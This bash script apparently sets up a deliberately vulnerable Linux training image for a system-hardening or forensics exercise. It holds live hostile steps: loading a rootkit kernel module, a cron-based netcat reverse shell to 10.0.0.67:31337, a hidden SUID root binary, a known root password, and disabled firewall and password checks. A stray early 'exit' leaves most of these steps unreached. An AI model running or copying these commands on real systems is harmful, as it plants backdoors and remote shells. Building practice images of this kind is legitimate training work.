#!/usr/bin/env bash

uid=`id -g`

if [ "$uid" != "0" ]; then
  echo "run script with sudo"
  echo "sudo ${0}"
  exit
fi

source ./config.sh
source ./helpers.sh

# install forensics questions
echo "install forensics questions"
declare -n list="${forensics_questions[questions]}"
for file in "${list[@]}"; do
  cp -f ./forensics/$file $location
  chown ${cpuser}:${cpuser} ${location}/${file}
  chmod 0644 ${location}/${file}
done

# install rootkit
# we aren't trying to hid this so install it so we can
# find it with modinfo
#find /lib/modules/ -type f -name cpnofind.ko | xargs rm
(cd orig/rootkit/ && make && make install && depmod -A)
mkdir -p /var/nonofind/
echo "password_value=1ts4m3M4r10" > /var/nonofind/secret_password.txt
insmod orig/rootkit/cpnofind.ko
(cd orig/rootkit && make clean)
exit
# set nameserver
sed 's/nameserver.*/nameserver 8.8.8.8/' -i /etc/resolv.conf

# set mint update settings
sudo -iu $SUDO_USER dbus-launch gsettings set com.linuxmint.updates refresh-schedule-enabled falsemintupdate-automation upgrade disable
systemctl stop mintupdate-automation-upgrade.timer

# cron/at
apt install at -y
crontab -r -u harry
killall -u harry
rm /etc/cron.allow
rm /etc/cron.deny
rm /etc/at.allow
rm /etc/at.deny

# set up users
configure_users

# insecure perms in /home/
chmod 755 /home/kerri

# root interactive login
apt install whois
passwd -u root
usermod -p $(mkpasswd -m yescrypt Pat42#ncs) root

# add groups
declare -n list=groups_create_list
for group in "${list[@]}"; do
  delgroup $group
done

# add packages
declare -n list=packages_unauth_list
for pkg in "${list[@]}"; do
  apt install $pkg -y
done

# add services
declare -n list=services_unauth_list
for svc in "${list[@]}"; do
  apt install $svc -y
  systemctl unmask $svc
  systemctl enable $svc
  systemctl start $svc
done

# remove packages (don't remove these meh)
#declare -n list=packages_critical_list
#for pkg in "${list[@]}"; do
#  apt purge $pkg -y
#done
#apt autoremove -y

# install packages
apt install openssh-server # make sure this is installed
declare -n list=packages_install_list
for pkg in "${list[@]}"; do
  apt purge $pkg -y
done
apt autoremove -y

apt purge stacer -y
apt autoremove -y

# special case downgrade thunderbird
apt --allow-downgrades install thunderbird=1:91.8.0+build2-0ubuntu1 -y

# special case downgrade vivaldi but add their signing key and ppa for later
apt install wget -y
echo "echo deb [arch=amd64] https://repo.vivaldi.com/stable/deb/ stable main > /etc/apt/sources.list.d/vivaldi.list"
wget http://repo.vivaldi.com/stable/linux_signing_key.pub | sudo apt-key add -
#apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 1397BC53640DB551
apt --fix-missing update
#apt install vivaldi-stable
curl -O https://downloads.vivaldi.com/stable/vivaldi-stable_6.8.3381.50-1_amd64.deb
apt install --allow-downgrades './vivaldi-stable_6.8.3381.50-1_amd64.deb' -y
rm vivaldi-stable_6.8.3381.50-1_amd64.deb

# get rid of cracklib
apt purge libpam-pwquality -y
apt purge libpam-cracklib -y
apt autoremove -y

# suid file
cc -o /var/log/.harmless orig/suid.c
chown root:root /var/log/.harmless
chmod 4755 /var/log/.harmless

# install orig files
cp -f orig/common-* /etc/pam.d/
cp -f orig/login.defs /etc/
cp -f orig/sysctl.conf /etc/
cp -f orig/lightdm.conf /etc/lightdm/
cp -f orig/sshd_config /etc/ssh/

# reverse shell crontab for harry
rm /tmp/leet
cat <(echo "* * * * * rm /tmp/leet; mkfifo /tmp/leet; </tmp/leet /bin/sh -i 2>&1 | nc -q2 10.0.0.67 31337 >/tmp/leet") | crontab -u harry -

# ufw
ufw disable
apt purge ufw -y
apt autoremove -y

# make some files world writable
chmod 777 /etc/ssh/ssh_config
chmod 777 /etc/ssh/sshd_config

# make some music
EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
declare -n hash=contraband_files
location="${hash[location]}"
debug "${location}"
declare -n list="${hash[files]}"
mkdir -p "${location}"
for file in "${list[@]}"; do
  echo "$EICAR" > "${location}/${file}"
done

rm linux_signing_key*
